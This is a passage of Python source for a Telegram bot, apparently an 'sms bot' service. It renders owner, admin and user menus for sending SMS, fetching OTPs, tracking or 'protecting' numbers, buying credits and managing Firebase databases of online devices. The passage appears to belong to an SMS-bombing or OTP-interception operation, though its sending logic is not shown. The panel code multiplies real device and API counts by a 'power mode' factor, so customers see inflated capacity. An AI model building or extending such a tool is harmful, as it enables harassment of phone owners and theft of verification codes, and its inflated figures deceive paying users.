            btn("activity log", "owner:activity", EMOJI_GEAR, "📜", style="primary"),
            btn("audit log", "owner:audit", EMOJI_LOCK, "🔐", style="primary"),
        ],
        [
            btn("pricing plans", "owner:pricing:menu", EMOJI_MONEY, "💳", style="primary"),
            btn("redeem codes", "owner:redeem:menu", EMOJI_GIFT, "🎁", style="primary"),
        ],
        [
            btn("set limit", "owner:set_limit", EMOJI_LOCK, "🔒", style="danger"),
            btn("set otp limit", "owner:set_otp_limit", EMOJI_OTP, "🔐", style="danger"),
        ],
        [
            btn("view limits", "owner:list_limits", EMOJI_LOCK, "📋", style="primary"),
            btn("force join", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary"),
        ],
        [
            btn("sms history", "owner:sms_history", EMOJI_STAR, "📋", style="primary"),
            btn("otp history", "owner:otp_history", EMOJI_OTP, "🔐", style="primary"),
        ],
        [
            btn("firebase health", "owner:fbhealth", EMOJI_CHART, "💊", style="primary"),
            btn("coin ledger", "owner:coin_ledger", EMOJI_COIN, "🪙", style="primary"),
        ],
        [
            btn("templates", "owner:templates:menu", EMOJI_FILE, "📝", style="primary"),
            btn("scheduled", "owner:scheduled:menu", EMOJI_CLOCK, "⏰", style="primary"),
        ],
        [
            btn("support tickets", "owner:tickets:menu", EMOJI_BELL, "📩", style="primary"),
            btn("appeals", "owner:appeals:menu", EMOJI_USER, "🔓", style="primary"),
        ],
        [
            btn("announcements", "owner:announce:menu", EMOJI_BELL, "📣", style="primary"),
            btn("user groups", "owner:groups:menu", EMOJI_USER, "👥", style="primary"),
        ],
        [
            btn("upcoming updates", "owner:upcoming:menu", EMOJI_NEW, "🔮", style="primary"),
            btn("leaderboard", "owner:leaderboard:menu", EMOJI_CHART, "🏆", style="primary"),
        ],
        [
            btn(f"services maint ({svc_down})", "owner:maint:menu", EMOJI_GEAR, "🔧", style="primary"),
            btn("settings", "owner:settings", EMOJI_GEAR, "⚙️", style="primary"),
        ],
        [
            btn("protect number", "owner:protect", EMOJI_LOCK, "🔒", style="danger"),
            btn("protected list", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary"),
        ],
        [
            btn("track number", "owner:track", EMOJI_STAR, "📊", style="primary"),
            btn("edit owner name", "owner:edit_name", EMOJI_CROWN, "✏️", style="primary"),
        ],
        [
            btn("connect / change GitHub repo", "owner:gh:connect", EMOJI_FILE, "🔗", style="primary"),
        ],
        [
            btn("github sync", "owner:gh:sync", EMOJI_FILE, "📤", style="primary"),
            btn("restore", "owner:gh:restore", EMOJI_FILE, "📥", style="danger"),
        ],
        [btn("export script", "owner:export_script", EMOJI_GEAR, "📤", style="primary")],
        [InlineKeyboardButton(text=maint_lbl, callback_data="owner:toggle_maint")],
        [btn(f"🎚️ POWER MODE: {CURRENT_POWER_MODE}x — TAP TO CHANGE", "noop", None, "", style="success")],
        power_row(),
        [btn("refresh", "owner:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

# ============================================================
#  ADMIN PANEL KEYBOARD
# ============================================================
def admin_kb(d):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("send sms", "user:send", EMOJI_ROCKET, "📤", style="success"),
            btn("get otp", "user:otp:menu", EMOJI_OTP, "🔐", style="primary"),
        ],
        [
            btn("manage videos", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"),
            btn("view users", "admin:users:list", EMOJI_USER, "👥", style="primary"),
            btn("add data (JSON)", "admin:data:import", EMOJI_FILE, "📥", style="primary"),
        ],
        [
            btn("api stats", "admin:stats", EMOJI_CHART, "📊", style="primary"),
            btn("broadcast", "admin:broadcast", EMOJI_BELL, "📢", style="primary"),
        ],
        [
            btn("ban user", "admin:ban", EMOJI_CROSS, "🚫", style="danger"),
            btn("unban user", "admin:unban:menu", EMOJI_CHECK, "✅", style="success"),
        ],
        [
            btn("tickets", "admin:tickets:menu", EMOJI_BELL, "📩", style="primary"),
        ],
        [btn("refresh", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

# ============================================================
#  USER PANEL KEYBOARD (maintenance indicators)
# ============================================================
def user_kb(d=None):
    if d is None:
        d = load()

    def label(txt, svc):
        if d.get("settings", {}).get("maintenance") or is_service_down(d, svc):
            return f"🔧 {txt}"
        return txt

    return InlineKeyboardMarkup(inline_keyboard=[
        [btn(label("send sms", "send_sms"), "user:send", EMOJI_ROCKET, "📤", style="success")],
        [btn(label("get otp", "get_otp"), "user:otp:menu", EMOJI_OTP, "🔐", style="primary")],
        [
            btn(label("my wallet", "wallet"), "user:wallet", EMOJI_MONEY, "💳", style="primary"),
            btn(label("videos", "videos"), "user:random_video", EMOJI_VIDEO, "📹", style="primary"),
        ],
        [
            btn(label("redeem", "redeem"), "user:redeem", EMOJI_GIFT, "🎁", style="primary"),
            btn(label("refer", "refer"), "user:refer", EMOJI_USER, "👥", style="primary"),
        ],
        [
            btn("stats", "user:stats", EMOJI_CHART, "📊", style="primary"),
            btn("my history", "user:sms_history", EMOJI_CLOCK, "📜", style="primary"),
        ],
        [
            btn("otp history", "user:otp_history", EMOJI_OTP, "🔐", style="primary"),
            btn(label("daily bonus", "daily_bonus"), "user:daily_bonus", EMOJI_GIFT, "🎁", style="success"),
        ],
        [
            btn(label("templates", "templates"), "user:templates:menu", EMOJI_FILE, "📝", style="primary"),
            btn(label("buy credits", "pricing"), "user:pricing", EMOJI_MONEY, "💰", style="success"),
        ],
        [
            btn(label("transfer", "transfer"), "user:transfer:menu", EMOJI_MONEY, "💸", style="primary"),
            btn(label("gift coins", "gift"), "user:gift:menu", EMOJI_COIN, "🎁", style="primary"),
        ],
        [
            btn(label("support", "support"), "user:support", EMOJI_BELL, "📩", style="primary"),
            btn("info", "user:info", EMOJI_GEAR, "ℹ️", style="primary"),
        ],
        [
            btn(label("🔮 coming soon", "upcoming"), "user:upcoming", EMOJI_NEW, "🔮", style="primary"),
            btn("🏆 leaderboard", "user:leaderboard", EMOJI_CHART, "🏆", style="primary"),
        ],
    ])

# ============================================================
#  WALLET KEYBOARD
# ============================================================
def wallet_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("transfer credits", "user:transfer:credits", EMOJI_MONEY, "💸", style="primary"),
            btn("transfer coins", "user:transfer:coins", EMOJI_COIN, "🪙", style="primary"),
        ],
        [
            btn("buy", "user:pricing", EMOJI_MONEY, "🛒", style="success"),
            btn("coin ledger", "user:coin_ledger", EMOJI_COIN, "📜", style="primary"),
        ],
        [btn("back", "user:home", EMOJI_GEAR, "🔙")],
    ])

# ============================================================
#  FIREBASE MENU — OWNER (real labels, real URLs)
# ============================================================
def fb_menu_owner_kb(d, page=0):
    fbs = d.get("firebases", [])
    per = 8
    tp = max(1, (len(fbs) + per - 1) // per)
    page = max(0, min(page, tp - 1))
    start = page * per
    curr = fbs[start:start + per]
    rows = [
        [btn("➕ add firebase (text/file)", "owner:fb:add", EMOJI_PLUS, "➕", style="success")],
        [btn("bulk add (multi-file)", "owner:fb:add_multi", EMOJI_FILE, "📁")],
    ]
    for i, fb in enumerate(curr):
        lbl = fb.get("label", fb["url"].replace("https://", ""))
        if len(lbl) > 16:
            lbl = lbl[:14] + ".."
        rows.append([
            btn(lbl, "noop", EMOJI_FIRE, "🔥"),
            btn("remove", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑"),
        ])
    nav = []
    if page > 0:
        nav.append(btn("prev", f"owner:fb:menu:{page - 1}", EMOJI_GEAR, "◀️"))
    if page < tp - 1:
        nav.append(btn("next", f"owner:fb:menu:{page + 1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  FIREBASE MENU — ADMIN (masked labels, no URLs)
# ============================================================
def fb_menu_admin_kb(d, page=0):
    fbs = d.get("firebases", [])
    per = 8
    tp = max(1, (len(fbs) + per - 1) // per)
    page = max(0, min(page, tp - 1))
    start = page * per
    curr = fbs[start:start + per]
    rows = []
    for i, fb in enumerate(curr):
        masked = f"Firebase {start + i + 1}"
        rows.append([
            btn(masked, f"admin:fb:view:{fb['id']}", EMOJI_FIRE, "🔥"),
        ])
    nav = []
    if page > 0:
        nav.append(btn("prev", f"admin:fb:menu:{page - 1}", EMOJI_GEAR, "◀️"))
    if page < tp - 1:
        nav.append(btn("next", f"admin:fb:menu:{page + 1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
    rows.append([btn("back", "admin:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  OWNERS / ADMINS MENU KEYBOARDS
# ============================================================
def owners_menu_kb(d):
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("add super admin", "owner:owners:add", EMOJI_PLUS, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (main)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([
                btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"),
                btn("remove", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑"),
            ])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d):
    admins = d.get("admins", [])
    rows = [[btn("add admin", "owner:admins:add", EMOJI_PLUS, "➕")]]
    for aid in admins:
        rows.append([
            btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"),
            btn("remove", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑"),
        ])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d, prefix):
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("back", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  VIDEOS MENU
# ============================================================
def videos_menu_kb(d):
    vids = d.get("videos", [])
    rows = [
        [btn("add video", "owner:videos:add", EMOJI_PLUS, "➕")],
        [btn("bulk delete all", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")],
    ]
    for idx in range(len(vids)):
        rows.append([
            btn(f"Video #{idx + 1}", "noop", EMOJI_VIDEO, "📹"),
            btn("remove", f"owner:videos:del:{idx}", EMOJI_CROSS, "🗑"),
        ])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  FORCE JOIN MENU
# ============================================================
def fj_menu_kb(d):
    fj = d.get("force_join", {})
    rows = [
        [btn("add channel/group", "owner:fj:add", EMOJI_PLUS, "➕")],
        [btn("remove channel/group", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [btn("test / diagnose", "owner:fj:test", EMOJI_WARNING, "🧪", style="primary")],
        [btn("manage bypass", "owner:fj:bypass", EMOJI_USER, "🔓", style="primary")],
        [btn("force join stats", "owner:fj:stats", EMOJI_CHART, "📊", style="primary")],
        [InlineKeyboardButton(
            text="🟢 ENABLE" if not fj.get("enabled") else "🔴 DISABLE",
            callback_data="owner:fj:toggle",
        )],
        [btn("back", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fj_kb(missing):
    rows = []
    for ch in missing:
        label = ch.get("title", "Channel")[:20]
        rows.append([btn_url(f"join {label}", ch["link"], EMOJI_BELL, "🔔", style="success")])
    rows.append([btn("check again", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  MAINTENANCE SERVICES MENU (owner)
# ============================================================
def maint_menu_kb(d):
    svc = d.get("settings", {}).get("maintenance_services", {})
    labels = {
        "send_sms": "📤 Send SMS",
        "get_otp": "🔐 Get OTP",
        "wallet": "💳 Wallet",
        "redeem": "🎁 Redeem",
        "refer": "👥 Refer",
        "transfer": "💸 Transfer",
        "daily_bonus": "🎁 Daily Bonus",
        "pricing": "💰 Pricing",
        "videos": "📹 Videos",
        "support": "📩 Support",
        "gift": "🎁 Gift",
        "upcoming": "🔮 Coming Soon",
        "templates": "📝 Templates",
    }
    rows = []
    for key in SERVICE_KEYS:
        on = bool(svc.get(key, False))
        status = "🔴 DOWN" if on else "🟢 UP"
        label = f"{labels.get(key, key)} — {status}"
        rows.append([
            InlineKeyboardButton(text=label, callback_data=f"owner:maint:toggle:{key}"),
        ])
    rows.append([btn("edit service msg", "owner:maint:msglist", EMOJI_FILE, "📝", style="primary")])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  UPCOMING UPDATES MENU (owner)
# ============================================================
def upcoming_menu_kb(d):
    items = d.get("upcoming_updates", [])
    visible = bool(d.get("upcoming_visible", True))
    vis_lbl = "🟢 VISIBLE" if visible else "🔴 HIDDEN"
    rows = [
        [btn("add new update", "owner:upcoming:add", EMOJI_PLUS, "➕", style="success")],
    ]
    for item in items[:10]:
        rows.append([
            btn(item.get("title", "?")[:20], "noop", EMOJI_NEW, "🔮"),
            btn("remove", f"owner:upcoming:del:{item['id']}", EMOJI_CROSS, "🗑"),
        ])
    if len(items) > 10:
        rows.append([btn(f"+{len(items) - 10} more", "noop", EMOJI_FILE, "📄")])
    rows.append([
        InlineKeyboardButton(text=vis_lbl, callback_data="owner:upcoming:toggle"),
    ])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  TICKETS MENU (owner)
# ============================================================
def tickets_menu_kb(d):
    tickets = [t for t in d.get("tickets", []) if t.get("status") == "open"]
    rows = []
    for t in tickets[:10]:
        tid = t["id"]
        uid = t["uid"]
        label = f"{tid[-6:]} · {uid}"
        rows.append([btn(label, f"owner:ticket:view:{tid}", EMOJI_BELL, "📩")])
    if len(tickets) > 10:
        rows.append([btn(f"+{len(tickets) - 10} more", "noop", EMOJI_FILE, "📄")])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def ticket_view_kb(ticket_id, is_owner=True):
    prefix = "owner" if is_owner else "user"
    rows = [
        [btn("reply", f"{prefix}:ticket:reply:{ticket_id}", EMOJI_FILE, "✏️", style="success")],
        [btn("close ticket", f"{prefix}:ticket:close:{ticket_id}", EMOJI_CROSS, "🗑", style="danger")],
        [btn("back", f"{prefix}:tickets:menu", EMOJI_GEAR, "🔙")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  LEADERBOARD MENU
# ============================================================
def leaderboard_kb(prefix="user", period="all"):
    def mk(p, label):
        style = "success" if period == p else "primary"
        return btn(label, f"{prefix}:lb:show:{p}", None, "", style=style)
    rows = [
        [mk("7d", "7 days"), mk("30d", "30 days"), mk("all", "All time")],
        [btn("back", f"{prefix}:home", EMOJI_GEAR, "🔙")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  GROUP PANEL KEYBOARD (in-group, admin only)
# ============================================================
def group_kb(d, chat_id):
    gs = d.get("group_settings", {}).get(str(chat_id), {})
    muted = gs.get("stop", False)
    welcome = gs.get("welcome", True)
    mute_lbl = "🟢 Bot ON" if not muted else "🔴 Bot OFF"
    wel_lbl = "🟢 Welcome ON" if welcome else "🔴 Welcome OFF"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=mute_lbl, callback_data=f"group:toggle_mute:{chat_id}")],
        [InlineKeyboardButton(text=wel_lbl, callback_data=f"group:toggle_welcome:{chat_id}")],
        [InlineKeyboardButton(text="📊 Group stats", callback_data=f"group:stats:{chat_id}")],
        [InlineKeyboardButton(text="🔄 Refresh", callback_data=f"group:refresh:{chat_id}")],
    ])

# ============================================================
#  TERMS GATE — already defined in part 1
# ============================================================

# ============================================================
#  PANEL TEXT HELPERS
# ============================================================
def _fb_summary(d=None):
    source = FB_DEVICE_COUNTS if FB_DEVICE_COUNTS else LAST_KNOWN_FB_COUNTS
    items = list(source.items())[:5]
    lines = []
    for fb_id, fd in items:
        age = int(time.time() - fd.get("last_update", 0))
        s = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        lines.append(
            f"  {s} {esc(str(fd.get('label', 'N/A'))[:20])}: "
            f"<b>{int(fd.get('online', 0)) * CURRENT_POWER_MODE}</b> ᴀᴘɪs"
        )
    if len(source) > 5:
        lines.append(f"  {em(EMOJI_STAR, '➕')} +{len(source) - 5} more...")
    return "\n".join(lines) if lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

# ============================================================
#  OWNER PANEL TEXT
# ============================================================
def owner_panel_text(d):
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    fj = d.get("force_join", {})
    fj_s = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    maint = d.get("settings", {}).get("maintenance", False)
    m_s = f"{em(EMOJI_WARNING, '🔧')} ᴏɴ" if maint else f"{em(EMOJI_CHECK, '🟢')} ᴏғғ"
    svc_down = sum(1 for v in d.get("settings", {}).get("maintenance_services", {}).values() if v)
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    otp_active = len([s for s in OTP_LIVE_SESSIONS.values() if s.get("task") and not s["task"].done()])
    owner_disp = get_owner_display(d)
    owner_line = f"<b>Owner:</b> {esc(owner_disp)}\n" if owner_disp else ""
    total_coins = sum(int(u.get("coins", 0)) for u in users.values())
    total_credits = sum(int(u.get("credits", 0)) for u in users.values())
    gh_s = "🟢 ᴀᴄᴛɪᴠᴇ" if GITHUB_ENABLED else "🔴 ᴏғғ"
    return (
        f"╭───────────────────────╮\n"
        f"   {em(EMOJI_CROWN, '👑')} <b>{sc('sanjipro panel')}</b> • {_VERSION}\n"
        f"╰───────────────────────╯\n"
        f"{owner_line}"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴘᴏᴡᴇʀ ᴍᴏᴅᴇ    : <b>{CURRENT_POWER_MODE}x</b>\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_USER, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_MONEY, '💰')} ᴛᴏᴛᴀʟ ᴄʀᴇᴅɪᴛs : <b>{total_credits}</b>\n"
        f"{em(EMOJI_COIN, '🪙')} ᴛᴏᴛᴀʟ ᴄᴏɪɴs  : <b>{total_coins}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ ғᴇᴛᴄʜ    : <b>{stats.get('otp_fetches', 0)}</b>\n"
        f"{em(EMOJI_OTP, '♻️')} ᴏᴛᴘ ʀᴇғᴜɴᴅs   : <b>{stats.get('otp_refunds', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs : <b>{active}</b>\n"
        f"{em(EMOJI_OTP, '🔐')} ᴀᴄᴛɪᴠᴇ ᴏᴛᴘ   : <b>{otp_active}</b>\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ   : {fj_s}\n"
        f"{em(EMOJI_WARNING, '🔧')} ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ  : {m_s}\n"
        f"{em(EMOJI_GEAR, '⚙️')} sᴇʀᴠɪᴄᴇs ᴅᴏᴡɴ : <b>{svc_down}</b>\n"
        f"{em(EMOJI_FILE, '📤')} ɢɪᴛʜᴜʙ sʏɴᴄ  : {gh_s}\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ    : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_PHONE, '📱')} <b>ᴘᴇʀ ғɪʀᴇʙᴀsᴇ</b>\n{_fb_summary()}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ: {get_scan_status()}\n"
        f"<i>🔄 auto-refresh every {_PANEL_REFRESH_INTERVAL:.0f}s</i>"
    )

# ============================================================
#  ADMIN PANEL TEXT (URLs hidden, masked labels)
# ============================================================
def admin_panel_text(d):
    users = d.get("users", {})
    stats = d.get("stats", {})
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    fbs = d.get("firebases", [])
    fbs_masked = []
    source = FB_DEVICE_COUNTS if FB_DEVICE_COUNTS else LAST_KNOWN_FB_COUNTS
    for i, fb in enumerate(fbs[:5]):
        fd = source.get(fb["id"], {})
        online = int(fd.get("online", 0)) * CURRENT_POWER_MODE
        age = int(time.time() - fd.get("last_update", 0)) if fd else 999
        s = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fbs_masked.append(f"  {s} Firebase {i + 1}: <b>{online}</b> ᴀᴘɪs")
    if len(fbs) > 5:
        fbs_masked.append(f"  {em(EMOJI_STAR, '➕')} +{len(fbs) - 5} more...")
    fb_lines = "\n".join(fbs_masked) if fbs_masked else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"
    return (
        f"╭───────────────────────╮\n"
        f"   {em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> • {_VERSION}\n"
        f"╰───────────────────────╯\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_USER, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴘᴏᴡᴇʀ ᴍᴏᴅᴇ    : <b>{CURRENT_POWER_MODE}x</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(d.get('banned', []))}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs : <b>{active}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_PHONE, '📱')} <b>ᴘᴇʀ ғɪʀᴇʙᴀsᴇ (masked)</b>\n{fb_lines}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ      : {get_scan_status()}"
    )

# ============================================================
#  USER HOME TEXT
# ============================================================
def user_home_text(uid, d):
    udata = d["users"].get(str(uid), {})
    credits = udata.get("credits", 0)
    coins = udata.get("coins", 0)
    real = len(CACHED_DEVICES)
    shown = real * CURRENT_POWER_MODE if real > 0 else LAST_KNOWN_DEVICE_COUNT
    limit = get_user_send_limit(uid, d)
    otp_limit = get_user_otp_limit(uid, d)

    if is_admin(uid, d) or is_owner(uid, d) or limit is None:
        limit_line = f"{em(EMOJI_LOCK, '🔓')} sᴍs ʟɪᴍɪᴛ : <b>ᴜɴʟɪᴍɪᴛᴇᴅ</b>"
    elif limit <= 0:
        limit_line = f"{em(EMOJI_CROSS, '🚫')} sᴍs ʟɪᴍɪᴛ : <b>BLOCKED</b>"
    else:
        limit_line = f"{em(EMOJI_LOCK, '🔒')} sᴍs ʟɪᴍɪᴛ : <b>{limit}</b>"

    if is_admin(uid, d) or is_owner(uid, d) or otp_limit is None:
        otp_line = f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ ʟɪᴍɪᴛ : <b>ᴜɴʟɪᴍɪᴛᴇᴅ</b>"
    elif otp_limit <= 0:
        otp_line = f"{em(EMOJI_CROSS, '🚫')} ᴏᴛᴘ ʟɪᴍɪᴛ : <b>BLOCKED</b>"
    else:
        otp_line = f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ ʟɪᴍɪᴛ : <b>{otp_limit}</b>"

    owner_disp = get_owner_display(d)
    owner_line = f"<b>Owner:</b> {esc(owner_disp)}\n" if owner_disp else ""
    otp_cost = get_otp_cost(d)
    prem = "💎 ᴘʀᴇᴍɪᴜᴍ" if is_premium(uid, d) else ""

    # terms status
    if has_accepted_terms(uid, d):
        terms_line = f"{em(EMOJI_CHECK, '✅')} ᴛᴇʀᴍs: ᴀᴄᴄᴇᴘᴛᴇᴅ"
    else:
        terms_line = f"{em(EMOJI_WARNING, '⚠️')} ᴛᴇʀᴍs: ᴘᴇɴᴅɪɴɢ"

    return (
        f"╭───────────────────────╮\n"
        f"   {em(EMOJI_ROCKET, '🚀')} <b>{sc('sanjipro sms bot')}</b>\n"
        f"        <i>{_VERSION}</i>\n"
        f"╰───────────────────────╯\n"
        f"{owner_line}"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_USER, '👤')} ʀᴏʟᴇ   : {role_tag(uid, d)} {prem}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs: <b>{credits}</b>\n"
        f"{em(EMOJI_COIN, '🪙')} ᴄᴏɪɴs  : <b>{coins}</b>\n"
        f"{em(EMOJI_STAR, '📤')} sᴇɴᴛ   : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ    : <b>{udata.get('otp_uses', 0)}</b> · ᴄᴏsᴛ <b>{otp_cost}</b> 🪙\n"
        f"{limit_line}\n"
        f"{otp_line}\n"
        f"{terms_line}\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs   : <b>{shown}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ: {get_scan_status()}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴏʀ <b>{sc('get otp')}</b> 🚀"
    )

# ============================================================
#  FIREBASE HEALTH VIEW
# ============================================================
def _firebase_health_text(d):
    fbs = d.get("firebases", [])
    fh = d.get("firebase_health", {})
    if not fbs:
        return "❌ No firebases added."
    lines = [f"{em(EMOJI_CHART, '📊')} <b>Firebase Health</b>\n"]
    for i, fb in enumerate(fbs[:20]):
        fid = fb["id"]
        h = fh.get(fid, {})
        ok = h.get("ok", 0)
        fail = h.get("fail", 0)
        last_err = h.get("last_error", "")
        st = FB_SCAN_ERRORS.get(fid, "")
        total = ok + fail
        rate = (ok / total * 100) if total else 0
        lbl = esc(fb.get("label", fb["url"][:20])[:20])
        lines.append(
            f"🔥 <b>{i + 1}. {lbl}</b>\n"
            f"   ✅ {ok} | ❌ {fail} | 📊 {rate:.0f}%\n"
            f"   {em(EMOJI_WARNING, '⚠️')} {esc(st or last_err or 'ok')[:40]}\n"
        )
    return "\n".join(lines)

# ============================================================
#  LEADERBOARD TEXT
# ============================================================
def leaderboard_text(d, period="all"):
    board = referral_leaderboard(d, period=period, limit=10)
    label = {"7d": "Last 7 days", "30d": "Last 30 days", "all": "All time"}.get(period, "All time")
    lines = [f"{em(EMOJI_CHART, '🏆')} <b>Referral Leaderboard</b>\n"]
    lines.append(f"<i>{label}</i>\n")
    if not board:
        lines.append("No referrals yet.")
        return "\n".join(lines)
    medals = ["🥇", "🥈", "🥉"]
    for entry in board:
        medal = medals[entry["rank"] - 1] if entry["rank"] <= 3 else f"{entry['rank']}."
        name = esc(str(entry["name"])[:24])
        lines.append(f"{medal} <b>{name}</b> — <b>{entry['count']}</b> refs · <code>{entry['uid']}</code>")
    return "\n".join(lines)

# ============================================================
#  UPCOMING UPDATES — USER VIEW
# ============================================================
def upcoming_user_text(d):
    items = d.get("upcoming_updates", [])
    if not items:
        return f"{em(EMOJI_NEW, '🔮')} <b>Coming Soon</b>\n\n<i>No updates announced yet.</i>"
    lines = [f"{em(EMOJI_NEW, '🔮')} <b>Coming Soon</b>\n"]
    for item in items[:15]:
        title = esc(str(item.get("title", "?")[:60]))
        desc = esc(str(item.get("description", "")[:300]))
        eta = item.get("eta", "")
        lines.append(f"✨ <b>{title}</b>")
        if desc:
            lines.append(f"   {desc}")
        if eta:
            lines.append(f"   ⏱ <i>ETA: {esc(eta)}</i>")
        lines.append("")
    return "\n".join(lines)

def upcoming_user_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
